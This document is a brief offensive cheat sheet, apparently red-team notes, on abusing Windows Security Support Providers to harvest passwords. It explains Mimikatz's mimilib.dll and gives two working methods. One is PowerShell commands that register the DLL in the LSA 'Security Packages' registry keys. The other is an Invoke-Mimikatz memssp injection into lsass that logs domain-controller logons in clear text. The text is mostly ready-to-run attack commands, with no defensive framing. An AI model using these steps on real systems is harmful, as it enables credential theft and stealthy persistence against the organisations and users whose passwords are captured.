- A Security Support Provider (SSP) is a DLL which provides ways for an application to obtain an authenticated connection. Some SSP Packages by Microsoft are
	- NTLM
	- Kerberos
	- Wdigest
	- CredSSP
- Mimikatz provides a custom SSP - mimilib.dll. This SSP logs local logons, service account and machine account passwords in clear text on the target server

# 2 Ways to exploit this
## #1
Drop the `mimilib.dll` to `system32` and add `mimilib` to
`HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`:

```powershell
$packages = Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages'| select -ExpandProperty 'Security Packages'
$packages += "mimilib"

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\ -Name 'Security Packages' -Value $packages

Set-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\ -Name 'Security Packages' -Value $packages
```

## #2
Using mimikatz, inject into lsass (Not stable with Server 2016):
```powershell
Invoke-Mimikatz -Command '"misc::memssp"'
```
Reboot machine. Then All local logons on the DC are logged to 
`C:\Windows\system32\kiwissp.log`

